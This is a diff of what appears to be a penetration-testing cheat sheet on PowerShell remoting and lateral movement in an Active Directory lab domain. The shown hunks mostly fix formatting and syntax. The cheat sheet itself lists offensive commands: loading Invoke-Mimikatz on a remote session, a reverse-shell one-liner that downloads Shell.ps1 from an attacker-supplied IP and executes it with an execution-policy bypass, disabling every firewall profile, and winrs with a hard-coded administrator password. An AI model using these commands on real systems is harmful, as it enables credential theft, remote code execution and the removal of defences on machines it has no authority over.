@@ -33,12 +33,11 @@ $sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
 
 #### Enter existing session
 
-```powershell
-Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
-
+<pre class="language-powershell"><code class="lang-powershell"><strong>Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+</strong>
 # Using session object
 Enter-PSSession -Session $sess
-```
+</code></pre>
 
 
 
@@ -64,7 +63,7 @@ Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session
 
 ```powershell
 # Language Mode
-Invoke-Command ComputerName <target> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
+Invoke-Command -ComputerName <target> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
 
 # Reverse shell
 Invoke-Command -ComputerName Srv01.Security.local -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<IP>/Shell.ps1')"}
@@ -91,7 +90,7 @@ Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}`
 ## Winrs
 
 ```powershell
-winrs -r:dcorp-mgmt <command>
-winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname 
+winrs -r:dcorp-mgmt 'whoami & hostname'
+winrs -r:server1 -u:server1\administrator -p:Pass@1234 'hostname' # With creds
 ```
 
